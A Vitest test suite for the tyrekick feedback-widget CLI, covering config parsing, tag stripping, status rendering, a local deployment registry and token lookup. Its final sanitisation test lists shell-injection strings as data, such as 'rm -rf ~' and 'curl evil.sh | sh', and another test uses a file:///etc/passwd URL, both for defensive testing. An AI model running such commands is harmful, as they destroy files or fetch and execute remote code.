import { describe, it, expect, afterAll, beforeEach, afterEach, vi } from "vitest";
import { rmSync, readFileSync, writeFileSync, mkdirSync, statSync } from "node:fs";
import { dirname } from "node:path";

// The deployment registry lives at ~/.tyrekick/deployments.json and its path is
// resolved when lib.mjs loads, so HOME has to be redirected BEFORE that import.
// vi.hoisted is the only thing that runs earlier.
const TMP_HOME = vi.hoisted(() => {
  const tmp = (process.env.TMPDIR || "/tmp").replace(/\/+$/, "");
  const dir = `${tmp}/tyrekick-registry-test-${process.pid}-${Date.now()}`;
  process.env.HOME = dir;
  return dir;
});
// The CLI helpers are plain Node ESM (zero-dep); import them directly.
import {
  stripTag,
  parseConfig,
  isEsmMount,
  parseEsmConfig,
  parseRateLimit,
  renderStatus,
  readinessNote,
  windowValue,
  setWindowInToml,
  readRegistry,
  rememberDeployment,
  REGISTRY_PATH,
  sendTest,
  tokenFor,
  probeOpen,
  findWidget,
  recordWidgetFile,
  readProjectConfig,
  mcpNames,
} from "../../bin/lib.mjs";

// Belt and braces: never let a bad hoist write into someone's real home.
if (!REGISTRY_PATH.startsWith(TMP_HOME)) {
  throw new Error(`registry tests would write to ${REGISTRY_PATH} — HOME redirect failed`);
}
afterAll(() => rmSync(TMP_HOME, { recursive: true, force: true }));

// The exact block `tyrekick init` injects (worker/json transport).
const jsonBlock =
  `  <!-- Tyrekick: reviewers pin feedback; agents pull it back (github.com/richardofortune/tyrekick) -->\n` +
  `  <script src="https://cdn.jsdelivr.net/npm/tyrekick@0.3/dist/tyrekick.js"\n` +
  `          data-webhook="https://demo.workers.dev/feedback"\n` +
  `          data-project-name="my-proto"\n` +
  `          data-app-version="v0.1"></script>\n`;

// The discord variant carries an extra data-transport line.
const discordBlock =
  `  <!-- Tyrekick: reviewers pin feedback; agents pull it back (github.com/richardofortune/tyrekick) -->\n` +
  `  <script src="https://cdn.jsdelivr.net/npm/tyrekick@0.3/dist/tyrekick.js"\n` +
  `          data-webhook="https://discord.com/api/webhooks/1/abc"\n` +
  `          data-transport="discord"\n` +
  `          data-project-name="my-proto"\n` +
  `          data-app-version="v0.1"></script>\n`;

const page = (block: string) =>
  `<!doctype html>\n<html><head><title>x</title></head>\n<body>\n  <h1>hi</h1>\n${block}</body></html>\n`;

describe("parseConfig", () => {
  it("extracts webhook, project, and version; defaults transport to json", () => {
    const c = parseConfig(jsonBlock);
    expect(c.webhook).toBe("https://demo.workers.dev/feedback");
    expect(c.project).toBe("my-proto");
    expect(c.appVersion).toBe("v0.1");
    expect(c.transport).toBe("json");
  });

  it("reads data-transport when present", () => {
    expect(parseConfig(discordBlock).transport).toBe("discord");
  });

  it("returns an empty object for a null block", () => {
    expect(parseConfig(null)).toEqual({});
  });
});

describe("stripTag", () => {
  it("removes the injected json block and returns it", () => {
    const html = page(jsonBlock);
    const { html: out, block } = stripTag(html);
    expect(block).toBe(jsonBlock);
    expect(out).not.toContain("tyrekick");
    expect(out).toContain("<h1>hi</h1>");
    expect(out).toContain("</body>");
  });

  it("also matches the discord variant", () => {
    const { block } = stripTag(page(discordBlock));
    expect(block).toBe(discordBlock);
  });

  it("returns block=null when there is no tag", () => {
    const clean = page("");
    const { html, block } = stripTag(clean);
    expect(block).toBeNull();
    expect(html).toBe(clean);
  });

  // The disable -> enable contract: stripping then re-inserting the returned
  // block before </body> must reproduce the original page byte-for-byte.
  it("round-trips: strip then restore reproduces the original", () => {
    for (const block of [jsonBlock, discordBlock]) {
      const original = page(block);
      const { html, block: removed } = stripTag(original);
      const restored = html.replace("</body>", `${removed}</body>`);
      expect(restored).toBe(original);
    }
  });
});

// The issue-#7 framework install: `import { init } from "tyrekick"` + init({...}).
const esmMount = `"use client"
import { useEffect } from "react"
export function TyrekickWidget() {
  useEffect(() => {
    import("tyrekick").then(({ init }) => {
      init({
        webhook: "https://demo.workers.dev/feedback",
        projectName: "my-next-app",
        appVersion: "1.2.0",
      })
    })
  }, [])
  return null
}
`;

describe("isEsmMount", () => {
  it("matches a dynamic import + init() mount", () => {
    expect(isEsmMount(esmMount)).toBe(true);
  });

  it("matches a static import mount", () => {
    expect(isEsmMount(`import { init } from "tyrekick";\ninit({ webhook: "x", appVersion: "1" });`)).toBe(true);
  });

  it("does not match a file that merely mentions tyrekick", () => {
    expect(isEsmMount(`export const note = "we use tyrekick for feedback";`)).toBe(false);
  });

  it("does not match a component that only renders <TyrekickWidget/> (no import/init)", () => {
    expect(isEsmMount(`import { TyrekickWidget } from "./TyrekickWidget";\nexport default () => <TyrekickWidget/>;`)).toBe(false);
  });
});

describe("parseEsmConfig", () => {
  it("extracts config from the init({...}) argument", () => {
    const c = parseEsmConfig(esmMount);
    expect(c.webhook).toBe("https://demo.workers.dev/feedback");
    expect(c.project).toBe("my-next-app");
    expect(c.appVersion).toBe("1.2.0");
    expect(c.transport).toBe("json");
  });

  it("reads an explicit transport when present", () => {
    expect(parseEsmConfig(`init({ webhook: "x", appVersion: "1", transport: "discord" })`).transport).toBe("discord");
  });
});

// --- public-share posture (the `status` doctor) ---------------------------

describe("reviewKey detection", () => {
  it("reads data-review-key from a script tag", () => {
    const block =
      `  <script src="https://cdn/tyrekick.js"\n` +
      `          data-webhook="https://demo.workers.dev/feedback"\n` +
      `          data-review-key="rk-secret"></script>\n`;
    expect(parseConfig(block).reviewKey).toBe("rk-secret");
  });

  it("is null when the widget carries no review key", () => {
    expect(parseConfig(jsonBlock).reviewKey).toBeNull();
  });

  it("reads reviewKey from an ESM init()", () => {
    expect(parseEsmConfig(`init({ webhook: "x", appVersion: "1", reviewKey: "rk-esm" })`).reviewKey).toBe("rk-esm");
  });
});

describe("parseRateLimit", () => {
  const unsafeForm = `
[[unsafe.bindings]]
name = "INGEST_LIMITER"
type = "ratelimit"
namespace_id = "1001"
simple = { limit = 15, period = 60 }

[[unsafe.bindings]]
name = "READ_LIMITER"
type = "ratelimit"
namespace_id = "1002"
simple = { limit = 120, period = 60 }
`;

  it("parses both limiters from the [[unsafe.bindings]] form", () => {
    const r = parseRateLimit(unsafeForm);
    expect(r.configured).toBe(true);
    expect(r.ingest).toEqual({ limit: 15, period: 60 });
    expect(r.read).toEqual({ limit: 120, period: 60 });
  });

  it("also parses the modern [[ratelimit]] form (binding = …)", () => {
    const modern = `
[[ratelimit]]
binding = "INGEST_LIMITER"
namespace_id = "1001"
simple = { limit = 30, period = 10 }
`;
    const r = parseRateLimit(modern);
    expect(r.ingest).toEqual({ limit: 30, period: 10 });
    expect(r.configured).toBe(true);
  });

  it("reports off when no limiter bindings are present", () => {
    const r = parseRateLimit(`name = "tyrekick-demo"\n[[kv_namespaces]]\nbinding = "FEEDBACK"\n`);
    expect(r.configured).toBe(false);
    expect(r.ingest).toBeNull();
    expect(r.read).toBeNull();
  });
});

// Minimal status object for the pure renderers.
function makeStatus(over: Record<string, unknown> = {}) {
  return {
    widget: { state: "installed", kind: "tag", file: "index.html" },
    cfg: { webhook: "https://demo.workers.dev/feedback" },
    transport: "json",
    worker: true,
    mcp: { registered: true, hasToken: true, cliMissing: false },
    reviewKey: null,
    rateLimit: { found: false, configured: false, ingest: null, read: null },
    secrets: { known: false, names: new Set() },
    project: "demo",
    ...over,
  } as never;
}

describe("renderStatus — public-share rows", () => {
  const text = (s: unknown) =>
    renderStatus(s as never)
      .map((r: string[]) => r.join("  "))
      .join("\n");

  it("shows shared review OFF and a rate-limit + AI-reply picture when all set", () => {
    const out = text(
      makeStatus({
        rateLimit: { found: true, configured: true, ingest: { limit: 15, period: 60 }, read: { limit: 120, period: 60 } },
        secrets: { known: true, names: new Set(["ANTHROPIC_API_KEY"]) },
      }),
    );
    expect(out).toMatch(/Shared review\s+off/);
    expect(out).toMatch(/Rate limit\s+✔ on — 15\/60s ingest, 120\/60s read/);
    expect(out).toMatch(/AI reply\s+✔ on/);
  });

  it("warns when shared review is ON", () => {
    expect(text(makeStatus({ reviewKey: "rk" }))).toMatch(/Shared review.*⚠ ON — anyone with the link/);
  });

  it("flags a rate limit that is present-but-off", () => {
    expect(text(makeStatus({ rateLimit: { found: true, configured: false, ingest: null, read: null } }))).toMatch(
      /Rate limit\s+✗ off/,
    );
  });

  it("flags a widget key with no matching worker secret", () => {
    const out = text(makeStatus({ reviewKey: "rk", secrets: { known: true, names: new Set() } }));
    expect(out).toMatch(/worker has none — \/shared will 401/);
  });

  it("omits worker-side rows entirely on the discord transport", () => {
    const out = text(makeStatus({ transport: "discord", cfg: { webhook: "https://discord.com/api/webhooks/1/a" } }));
    expect(out).not.toMatch(/Shared review|Rate limit|AI reply/);
  });
});

describe("readinessNote", () => {
  it("returns null when nothing needs flagging", () => {
    expect(readinessNote(makeStatus())).toBeNull();
  });

  it("flags shared review on", () => {
    expect(readinessNote(makeStatus({ reviewKey: "rk" }))).toMatch(/shared review is ON/);
  });

  it("flags missing rate limiting", () => {
    expect(readinessNote(makeStatus({ rateLimit: { found: true, configured: false } }))).toMatch(/no rate limiting/);
  });

  it("reminds about the spend limit when AI reply is on", () => {
    expect(readinessNote(makeStatus({ secrets: { known: true, names: new Set(["ANTHROPIC_API_KEY"]) } }))).toMatch(
      /spend limit/,
    );
  });

  it("says nothing for the discord transport", () => {
    expect(readinessNote(makeStatus({ transport: "discord" }))).toBeNull();
  });
});

// --- review window (close / reopen) ---------------------------------------

describe("windowValue", () => {
  const NOW = new Date("2026-09-01T04:00:00.000Z");

  it("close is now, exactly — not yesterday's date", () => {
    expect(windowValue(0, NOW)).toBe(NOW.toISOString());
  });

  it("reopen --days 14 is 14 days out to the millisecond", () => {
    expect(windowValue(14, NOW)).toBe(new Date(NOW.getTime() + 14 * 864e5).toISOString());
  });

  it("--never is an empty value, which is what 'never closes' looks like", () => {
    expect(windowValue(null)).toBe("");
  });

  it("returns null for a non-number so the caller can print a usage line", () => {
    expect(windowValue(NaN, NOW)).toBeNull();
    expect(windowValue("banana" as never, NOW)).toBeNull();
    expect(windowValue(undefined as never, NOW)).toBeNull();
  });
});

describe("setWindowInToml", () => {
  const V = "2026-09-15T00:00:00.000Z";
  // The real shipped template — case 1 has to hold against the actual file.
  const shipped = readFileSync("destinations/cloudflare/wrangler.toml", "utf8");

  it("rewrites the shipped template's existing line and changes nothing else", () => {
    const out = setWindowInToml(shipped, V);
    expect(out).toContain(`TYREKICK_OPEN_UNTIL = "${V}"`);
    expect(out.replace(`TYREKICK_OPEN_UNTIL = "${V}"`, 'TYREKICK_OPEN_UNTIL = ""')).toBe(shipped);
  });

  it("inserts under an existing [vars] table that has no key yet", () => {
    const toml = `name = "w"\n\n[vars]\nOTHER = "x"\n\n[[kv_namespaces]]\nbinding = "FEEDBACK"\n`;
    const out = setWindowInToml(toml, V);
    expect(out).toBe(`name = "w"\n\n[vars]\nTYREKICK_OPEN_UNTIL = "${V}"\nOTHER = "x"\n\n[[kv_namespaces]]\nbinding = "FEEDBACK"\n`);
  });

  // A trailing [vars] at EOF would swallow any [[…]] block appended later, so
  // a brand-new table must land BEFORE the first one.
  it("inserts a new [vars] block before the first table, never at EOF", () => {
    const toml = `name = "w"\nmain = "worker.ts"\n\n[[kv_namespaces]]\nbinding = "FEEDBACK"\n\n[[unsafe.bindings]]\nname = "INGEST_LIMITER"\n`;
    const out = setWindowInToml(toml, V);
    expect(out.indexOf("[vars]")).toBeLessThan(out.indexOf("[[kv_namespaces]]"));
    expect(out).toMatch(/\[vars\]\nTYREKICK_OPEN_UNTIL = "2026-09-15T00:00:00\.000Z"\n\n\[\[kv_namespaces\]\]/);
    expect(out).toContain("[[unsafe.bindings]]");
  });

  it("appends when the config has no tables at all", () => {
    const out = setWindowInToml(`name = "w"\nmain = "worker.ts"\n`, V);
    expect(out).toBe(`name = "w"\nmain = "worker.ts"\n\n[vars]\nTYREKICK_OPEN_UNTIL = "${V}"\n`);
  });

  it("is idempotent — applying the same value twice is a no-op", () => {
    for (const toml of [shipped, `name = "w"\n`, `[vars]\nA = "1"\n`, `name = "w"\n\n[[kv_namespaces]]\nid = "x"\n`]) {
      const once = setWindowInToml(toml, V);
      expect(setWindowInToml(once, V)).toBe(once);
    }
  });

  it("--never writes the key back as empty rather than deleting it", () => {
    expect(setWindowInToml(setWindowInToml(shipped, V), "")).toBe(shipped);
  });
});

describe("renderStatus — the Review row", () => {
  const text = (s: unknown) =>
    renderStatus(s as never)
      .map((r: string[]) => r.join("  "))
      .join("\n");

  it("open with no window", () => {
    expect(text(makeStatus({ review: { reachable: true, state: "open", open_until: null } }))).toMatch(
      /Review\s+✔ open$/m,
    );
  });

  it("open with a window shows when it closes", () => {
    expect(
      text(makeStatus({ review: { reachable: true, state: "open", open_until: "2026-09-15T00:00:00.000Z" } })),
    ).toMatch(/Review\s+✔ open · closes 15 Sep/);
  });

  it("closed says so and names the way back", () => {
    const out = text(
      makeStatus({ review: { reachable: true, state: "closed", open_until: "2026-08-28T00:00:00.000Z" } }),
    );
    expect(out).toMatch(/Review\s+⏸ closed 28 Aug · npx tyrekick reopen/);
  });

  it("omits the row when the worker didn't answer — 'open' would be a guess", () => {
    expect(text(makeStatus({ worker: false, review: { reachable: false, state: "open", open_until: null } }))).not.toMatch(
      /Review\s/,
    );
  });

  it("omits the row on the discord transport (write-only, nothing to close)", () => {
    const out = text(
      makeStatus({
        transport: "discord",
        cfg: { webhook: "https://discord.com/api/webhooks/1/a" },
        review: { reachable: true, state: "open", open_until: null },
      }),
    );
    expect(out).not.toMatch(/Review\s/);
  });
});

// --- the deployment registry (~/.tyrekick/deployments.json) ----------------

describe("readRegistry", () => {
  const seed = (contents: string) => {
    mkdirSync(dirname(REGISTRY_PATH), { recursive: true });
    writeFileSync(REGISTRY_PATH, contents);
  };

  it("returns an empty registry when the file does not exist", () => {
    rmSync(REGISTRY_PATH, { force: true });
    expect(readRegistry()).toEqual({ version: 1, deployments: [] });
  });

  it("never throws on a corrupt or unexpected file", () => {
    for (const contents of ["{not json", "null", "[]", '{"version":99,"deployments":[]}', '{"version":1}']) {
      seed(contents);
      expect(readRegistry()).toEqual({ version: 1, deployments: [] });
    }
  });

  it("drops rows that are not shaped like a deployment", () => {
    seed('{"version":1,"deployments":[null,{"project":"no url"},{"url":"https://a.test"}]}');
    expect(readRegistry().deployments).toEqual([{ url: "https://a.test" }]);
  });
});

describe("rememberDeployment", () => {
  // Wipe the directory too: mode is only applied at creation, so the perms
  // assertion below has to see writeRegistry create it.
  const reset = () => rmSync(dirname(REGISTRY_PATH), { recursive: true, force: true });

  it("records a worker once and reports whether it was new", () => {
    reset();
    expect(rememberDeployment("https://w.workers.dev/feedback", "proto")).toBe(true);
    expect(rememberDeployment("https://w.workers.dev/feedback", "proto")).toBe(false);
    expect(readRegistry().deployments).toHaveLength(1);
  });

  it("stores the worker BASE, so /feedback and /feedback/ are the same deployment", () => {
    reset();
    rememberDeployment("https://w.workers.dev/feedback", "proto");
    rememberDeployment("https://w.workers.dev/feedback/", "proto");
    rememberDeployment("https://w.workers.dev/", "proto");
    const { deployments } = readRegistry();
    expect(deployments).toHaveLength(1);
    expect(deployments[0].url).toBe("https://w.workers.dev");
  });

  it("refreshes project on a second call but never rewrites added_at", () => {
    reset();
    rememberDeployment("https://w.workers.dev/feedback", "old-name");
    const first = readRegistry().deployments[0].added_at;
    rememberDeployment("https://w.workers.dev/feedback", "renamed");
    const after = readRegistry().deployments[0];
    expect(after.project).toBe("renamed");
    expect(after.added_at).toBe(first);
  });

  it("never records a Discord webhook — write-only, nothing to close", () => {
    reset();
    expect(rememberDeployment("https://discord.com/api/webhooks/1/abc", "proto")).toBe(false);
    expect(readRegistry().deployments).toEqual([]);
  });

  it("refuses anything that is not an http(s) URL", () => {
    reset();
    for (const bad of ["", "not a url", "file:///etc/passwd", null, undefined, 42]) {
      expect(rememberDeployment(bad as never, "proto")).toBe(false);
    }
    expect(readRegistry().deployments).toEqual([]);
  });

  // A list of someone's in-flight prototypes is nobody else's business.
  it("writes the file 0600 inside a 0700 directory", () => {
    reset();
    rememberDeployment("https://w.workers.dev/feedback", "proto");
    expect(statSync(REGISTRY_PATH).mode & 0o777).toBe(0o600);
    expect(statSync(dirname(REGISTRY_PATH)).mode & 0o777).toBe(0o700);
  });

  // Constraint 5: the registry holds no secrets, by construction.
  it("stores three fields and nothing that could hold a credential", () => {
    reset();
    rememberDeployment("https://w.workers.dev/feedback", "proto");
    expect(Object.keys(readRegistry().deployments[0]).sort()).toEqual(["added_at", "project", "url"]);
  });
});

// A closed review answers 403 with a typed error. sendTest used to throw on the
// status before reading the body, flattening that to "HTTP 403" and sending the
// user off to debug a webhook URL that was never wrong.
describe("sendTest — a closed review is reported as closed, not as a bad URL", () => {
  const withFetch = async (res: unknown, transport = "json") => {
    const spy = vi.fn().mockResolvedValue(res);
    vi.stubGlobal("fetch", spy);
    try {
      await sendTest("https://w.example.dev/feedback", transport, "proj", "v1");
      return null;
    } catch (e) {
      return (e as Error).message;
    } finally {
      vi.unstubAllGlobals();
    }
  };

  it("surfaces review_closed from a 403 body instead of HTTP 403", async () => {
    const msg = await withFetch({
      ok: false,
      status: 403,
      json: async () => ({ ok: false, error: "review_closed", open_until: "2026-08-28T00:00:00.000Z" }),
    });
    expect(msg).toBe("review_closed");
  });

  it("still reports the status when the failure has no typed error", async () => {
    const msg = await withFetch({ ok: false, status: 500, json: async () => null });
    expect(msg).toBe("HTTP 500");
  });

  it("leaves discord alone — 204, no body read", async () => {
    const msg = await withFetch(
      { ok: true, status: 204, json: async () => { throw new Error("must not read body"); } },
      "discord",
    );
    expect(msg).toBeNull();
  });
});

// The registry holds no secrets, so `status --all` resolves each deployment's
// token from the environment. "no token" and "zero open" are different facts and
// the column must never print them the same way.
describe("tokenFor — per-project token resolution", () => {
  const clear = () => {
    for (const k of Object.keys(process.env)) if (k.startsWith("TYREKICK_TOKEN")) delete process.env[k];
  };

  it("prefers the per-project key over the bare one", () => {
    clear();
    process.env.TYREKICK_TOKEN = "generic";
    process.env.TYREKICK_TOKEN_job_radar = "specific";
    expect(tokenFor("job-radar")).toBe("specific");
    clear();
  });

  it("maps non-alphanumerics to underscores, matching the documented convention", () => {
    clear();
    process.env.TYREKICK_TOKEN_jobs_board_poc = "t";
    expect(tokenFor("jobs-board-poc")).toBe("t");
    clear();
  });

  it("falls back to the bare key, then to null", () => {
    clear();
    process.env.TYREKICK_TOKEN = "generic";
    expect(tokenFor("anything")).toBe("generic");
    clear();
    expect(tokenFor("anything")).toBeNull();
    expect(tokenFor(null)).toBeNull();
  });
});

describe("probeOpen — unknown is not the same as zero", () => {
  const withFetch = async (impl: unknown, token: string | null = "tok") => {
    vi.stubGlobal("fetch", vi.fn().mockImplementation(impl as never));
    try {
      return await probeOpen("https://w.example.dev/feedback", token);
    } finally {
      vi.unstubAllGlobals();
    }
  };

  it("returns null without a token rather than claiming zero", async () => {
    const spy = vi.fn();
    vi.stubGlobal("fetch", spy);
    expect(await probeOpen("https://w.example.dev/feedback", null)).toBeNull();
    expect(spy).not.toHaveBeenCalled();
    vi.unstubAllGlobals();
  });

  it("returns null when the worker refuses the token", async () => {
    expect(await withFetch(async () => ({ ok: false, status: 401, json: async () => null }))).toBeNull();
  });

  it("returns null on a network failure, not zero", async () => {
    expect(await withFetch(async () => { throw new Error("offline"); })).toBeNull();
  });

  it("returns only the open items", async () => {
    const items = [
      { id: "a", status: "open" },
      { id: "b", status: "resolved" },
      { id: "c", status: "open" },
    ];
    const got = await withFetch(async () => ({ ok: true, status: 200, json: async () => ({ ok: true, items }) }));
    expect(got?.map((x: { id: string }) => x.id)).toEqual(["a", "c"]);
  });

  it("returns an empty array for a genuinely clear inbox", async () => {
    const got = await withFetch(async () => ({ ok: true, status: 200, json: async () => ({ ok: true, items: [] }) }));
    expect(got).toEqual([]);
    expect(got).not.toBeNull();
  });
});

// `init --file` takes any path, but every later command used to re-guess from
// four conventional names. A project whose page is `nz-health-regions.html` was
// told its own install was missing, and Worker/MCP went blank with it.
describe("findWidget — honours the file init actually wrote to", () => {
  const cwd = process.cwd();
  let dir: string;

  beforeEach(() => {
    dir = `${TMP_HOME}/proj-${Math.random().toString(36).slice(2)}`;
    mkdirSync(dir, { recursive: true });
    process.chdir(dir);
  });
  afterEach(() => process.chdir(cwd));

  it("finds a tag in an unconventionally named file once it is recorded", () => {
    writeFileSync(`${dir}/nz-health-regions.html`, page(jsonBlock));
    expect(findWidget().state).toBe("none"); // the bug: not on the guess list
    recordWidgetFile("nz-health-regions.html");
    const w = findWidget();
    expect(w.state).toBe("installed");
    expect(w.file).toBe("nz-health-regions.html");
    expect(w.config.webhook).toBeTruthy();
  });

  it("merges into an existing .tyrekick.json instead of overwriting it", () => {
    writeFileSync(`${dir}/.tyrekick.json`, JSON.stringify({ slug: "x", workerUrl: "https://w.dev" }));
    recordWidgetFile("weird.html");
    expect(readProjectConfig()).toEqual({ slug: "x", workerUrl: "https://w.dev", file: "weird.html" });
  });

  it("falls through to the conventional names when the recorded file lost its tag", () => {
    writeFileSync(`${dir}/gone.html`, page(""));
    writeFileSync(`${dir}/index.html`, page(jsonBlock));
    recordWidgetFile("gone.html");
    expect(findWidget().file).toBe("index.html");
  });

  it("survives a corrupt .tyrekick.json rather than throwing", () => {
    writeFileSync(`${dir}/.tyrekick.json`, "{ not json");
    writeFileSync(`${dir}/index.html`, page(jsonBlock));
    expect(readProjectConfig()).toEqual({});
    expect(findWidget().file).toBe("index.html");
  });
});

// The project name reaches a shell command, and one machine holds many of these
// servers, so they cannot all be called `tyrekick`.
describe("mcpNames", () => {
  it("tries the documented name first, then the per-project one", () => {
    expect(mcpNames("map-nz")).toEqual(["tyrekick", "tyrekick-map-nz"]);
  });

  it("does not duplicate when the project is already called tyrekick", () => {
    expect(mcpNames("tyrekick")).toEqual(["tyrekick"]);
  });

  it("falls back to the bare name with no project", () => {
    expect(mcpNames("")).toEqual(["tyrekick"]);
    expect(mcpNames(null)).toEqual(["tyrekick"]);
  });

  it("strips anything a shell could act on", () => {
    for (const evil of ["foo; rm -rf ~", "a && curl evil.sh | sh", "`whoami`", "$(id)", "a b"]) {
      for (const n of mcpNames(evil)) expect(n).toMatch(/^[A-Za-z0-9_-]+$/);
    }
    expect(mcpNames("foo; rm -rf ~")).toEqual(["tyrekick", "tyrekick-foo--rm--rf"]);
  });
});
